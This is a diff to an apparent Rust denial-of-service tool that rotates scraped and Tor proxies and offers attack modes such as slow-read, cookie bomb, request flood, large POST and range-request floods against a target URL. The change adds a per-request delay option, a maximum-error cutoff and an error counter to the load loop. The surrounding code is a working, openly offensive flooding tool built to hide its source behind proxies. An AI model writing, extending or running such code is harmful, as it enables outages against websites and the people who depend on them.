@@ -80,6 +80,8 @@ fn print_help() {
     println!("  --output CSV    Write results to CSV file");
     println!("  --proxy-file F  Load proxy list from file (one per line or comma-separated)");
     println!("  --tor-proxy URL Specify custom Tor proxy URL (e.g. socks5://127.0.0.1:9050)");
+    println!("  --delay MS      Per-request delay in milliseconds");
+    println!("  --max-errors N  Stop after N failed requests");
     println!("");
     println!("Modes: scrape, tor, scrape-tor (proxy source)");
     println!("Attack modes: normal, bandwidth, slowread, imageopt, largepost, assetspray,");
@@ -296,7 +298,7 @@ async fn fetch_cookie(c: Client, url: String, delay: u64, _ua: usize, proxy_id: 
 
 #[allow(dead_code)]
 struct AppState {
-    mode: ProxyMode, running: bool, iteration: u64, total_requests: u64, total_bytes: u64,
+    mode: ProxyMode, running: bool, iteration: u64, total_requests: u64, total_bytes: u64, errors: u64,
     proxy_count: usize, working_count: usize, active_count: usize, last_bytes: u64,
     status_msg: String, proxy_status: Vec<(String, String)>,
     total_alive: usize, total_working: usize, total_scraped: usize,
@@ -314,7 +316,7 @@ struct AppState {
 
 impl AppState {
     fn new() -> Self { AppState {
-        mode: ProxyMode::Scrape, running: false, iteration: 0, total_requests: 0, total_bytes: 0,
+        mode: ProxyMode::Scrape, running: false, iteration: 0, total_requests: 0, total_bytes: 0, errors: 0,
         proxy_count: 0, working_count: 0, active_count: 0, last_bytes: 0,
         status_msg: "Ready".to_string(), proxy_status: vec![],
         total_alive: 0, total_working: 0, total_scraped: 0,
@@ -486,11 +488,16 @@ async fn get_proxies(mode: ProxyMode, state: &Arc<Mutex<AppState>>) -> Option<Ve
     }
 }
 
-async fn run_load(state: Arc<Mutex<AppState>>, pool: Arc<Mutex<ProxyPool>>) {
-    let (conc, interval, jitter, attack) = { let st = state.lock().await; (st.load_concurrency, st.interval_ms, st.jitter_ms, st.attack_mode) };
+async fn run_load(state: Arc<Mutex<AppState>>, pool: Arc<Mutex<ProxyPool>>, delay_ms: u64, max_errors: Option<u64>) {
+    let (conc, interval, attack) = { let st = state.lock().await; (st.load_concurrency, st.interval_ms, st.attack_mode) };
+    let delay = if delay_ms > 0 { delay_ms } else { interval };
     let semaphore = Arc::new(Semaphore::new(conc));
 
     loop {
+        if max_errors.is_some() && state.lock().await.errors >= max_errors.unwrap() {
+            println!("  Max errors ({}) reached, stopping.", max_errors.unwrap());
+            break;
+        }
         if !state.lock().await.running { tokio::time::sleep(Duration::from_millis(100)).await; continue; }
         let target_url = state.lock().await.target_url.clone();
         if target_url.is_empty() { tokio::time::sleep(Duration::from_millis(100)).await; continue; }
@@ -518,50 +525,49 @@ async fn run_load(state: Arc<Mutex<AppState>>, pool: Arc<Mutex<ProxyPool>>) {
                 let assets = assets.clone();
                 let attack = attack;
                 let target = target_url.clone();
-                let jitter = jitter;
                 let sessions = s.lock().await.sessions.clone();
                 let idx1 = rand::rng().random_range(0..assets.len());
                 let _ = tokio::spawn(async move {
                     let result = match attack {
                         AttackMode::Bandwidth | AttackMode::Normal => {
-                            if assets.is_empty() { fetch_page(client, target.clone(), jitter, 0, proxy_id.clone(), sessions.clone()).await }
-                            else { fetch_page(client, assets[idx1].clone(), jitter, 0, proxy_id.clone(), sessions.clone()).await }
+                            if assets.is_empty() { fetch_page(client, target.clone(), delay, 0, proxy_id.clone(), sessions.clone()).await }
+                            else { fetch_page(client, assets[idx1].clone(), delay, 0, proxy_id.clone(), sessions.clone()).await }
                         }
                         AttackMode::SlowRead => {
-                            fetch_slow(client, target.clone(), jitter, 0, proxy_id.clone(), sessions.clone()).await
+                            fetch_slow(client, target.clone(), delay, 0, proxy_id.clone(), sessions.clone()).await
                         }
                         AttackMode::ImageOpt => {
-                            if assets.is_empty() { fetch_page(client, target.clone(), jitter, 0, proxy_id.clone(), sessions.clone()).await }
-                            else { fetch_range(client, assets[idx1].clone(), jitter, 0, proxy_id.clone(), sessions.clone()).await }
+                            if assets.is_empty() { fetch_page(client, target.clone(), delay, 0, proxy_id.clone(), sessions.clone()).await }
+                            else { fetch_range(client, assets[idx1].clone(), delay, 0, proxy_id.clone(), sessions.clone()).await }
                         }
                         AttackMode::LargePost => {
-                            fetch_post(client, target.clone(), jitter, 0, proxy_id.clone(), sessions.clone()).await
+                            fetch_post(client, target.clone(), delay, 0, proxy_id.clone(), sessions.clone()).await
                         }
                         AttackMode::AssetSpray => {
-                            if assets.is_empty() { fetch_page(client, target.clone(), jitter, 0, proxy_id.clone(), sessions.clone()).await }
-                            else { fetch_page(client, assets[idx1].clone(), jitter, 0, proxy_id.clone(), sessions.clone()).await }
+                            if assets.is_empty() { fetch_page(client, target.clone(), delay, 0, proxy_id.clone(), sessions.clone()).await }
+                            else { fetch_page(client, assets[idx1].clone(), delay, 0, proxy_id.clone(), sessions.clone()).await }
                         }
                         AttackMode::RangeReq => {
-                            if assets.is_empty() { fetch_range(client, target.clone(), jitter, 0, proxy_id.clone(), sessions.clone()).await }
-                            else { fetch_range(client, assets[idx1].clone(), jitter, 0, proxy_id.clone(), sessions.clone()).await }
+                            if assets.is_empty() { fetch_range(client, target.clone(), delay, 0, proxy_id.clone(), sessions.clone()).await }
+                            else { fetch_range(client, assets[idx1].clone(), delay, 0, proxy_id.clone(), sessions.clone()).await }
                         }
                         AttackMode::CookieBomb => {
-                            fetch_cookie(client, target.clone(), jitter, 0, proxy_id.clone(), sessions.clone()).await
+                            fetch_cookie(client, target.clone(), delay, 0, proxy_id.clone(), sessions.clone()).await
                         }
                         AttackMode::SSR => {
-                            if assets.is_empty() { fetch_page(client, target.clone(), jitter, 0, proxy_id.clone(), sessions.clone()).await }
-                            else { fetch_page(client, assets[idx1].clone(), jitter, 0, proxy_id.clone(), sessions.clone()).await }
+                            if assets.is_empty() { fetch_page(client, target.clone(), delay, 0, proxy_id.clone(), sessions.clone()).await }
+                            else { fetch_page(client, assets[idx1].clone(), delay, 0, proxy_id.clone(), sessions.clone()).await }
                         }
                         AttackMode::Middleware => {
-                            if assets.is_empty() { fetch_page(client, target.clone(), jitter, 0, proxy_id.clone(), sessions.clone()).await }
-                            else { fetch_page(client, assets[idx1].clone(), jitter, 0, proxy_id.clone(), sessions.clone()).await }
+                            if assets.is_empty() { fetch_page(client, target.clone(), delay, 0, proxy_id.clone(), sessions.clone()).await }
+                            else { fetch_page(client, assets[idx1].clone(), delay, 0, proxy_id.clone(), sessions.clone()).await }
                         }
                         AttackMode::RequestFlood => {
                             fetch_page(client, target.clone(), 0, 0, proxy_id.clone(), sessions.clone()).await
                         }
                         AttackMode::NotFound => {
                             let path = format!("/nonexistent-{:08x}", rand::random::<u32>());
-                            fetch_page(client, format!("{}{}", target.trim_end_matches('/'), path), jitter, 0, proxy_id.clone(), sessions.clone()).await
+                            fetch_page(client, format!("{}{}", target.trim_end_matches('/'), path), delay, 0, proxy_id.clone(), sessions.clone()).await
                         }
                     };
                     if let Ok(bytes) = result {
@@ -569,6 +575,8 @@ async fn run_load(state: Arc<Mutex<AppState>>, pool: Arc<Mutex<ProxyPool>>) {
                         st.total_requests += 1;
                         st.total_bytes += bytes as u64;
                         st.last_bytes = bytes as u64;
+                    } else {
+                        s.lock().await.errors += 1;
                     }
                 });
                 break;
@@ -610,6 +618,8 @@ async fn main() {
     let mut output_csv: Option<String> = None;
     let mut proxy_file: Option<String> = None;
     let mut tor_proxy: Option<String> = None;
+    let mut delay_ms: u64 = 0;
+    let mut max_errors: Option<u64> = None;
     let mut positional: Vec<&str> = Vec::new();
     for arg in args.iter().skip(1) {
         match arg.as_str() {
@@ -617,6 +627,8 @@ async fn main() {
             "--output" => {},
             "--proxy-file" => {},
             "--tor-proxy" => {},
+            "--delay" => {},
+            "--max-errors" => {},
             other => {
                 if other.starts_with("--output=") {
                     output_csv = Some(other.strip_prefix("--output=").unwrap().to_string());
@@ -624,6 +636,10 @@ async fn main() {
                     proxy_file = Some(other.strip_prefix("--proxy-file=").unwrap().to_string());
                 } else if other.starts_with("--tor-proxy=") {
                     tor_proxy = Some(other.strip_prefix("--tor-proxy=").unwrap().to_string());
+                } else if other.starts_with("--delay=") {
+                    delay_ms = other.strip_prefix("--delay=").unwrap().parse().unwrap_or(0);
+                } else if other.starts_with("--max-errors=") {
+                    max_errors = other.strip_prefix("--max-errors=").unwrap().parse().ok();
                 } else {
                     positional.push(other);
                 }
@@ -719,7 +735,7 @@ async fn main() {
             state.lock().await.running = true;
             let state_clone = state.clone();
             let pool_clone = pool.clone();
-            tokio::spawn(run_load(state_clone, pool_clone));
+            tokio::spawn(run_load(state_clone, pool_clone, delay_ms, max_errors));
             tokio::time::sleep(Duration::from_secs(duration_secs)).await;
             state.lock().await.running = false;
             let final_stats = {
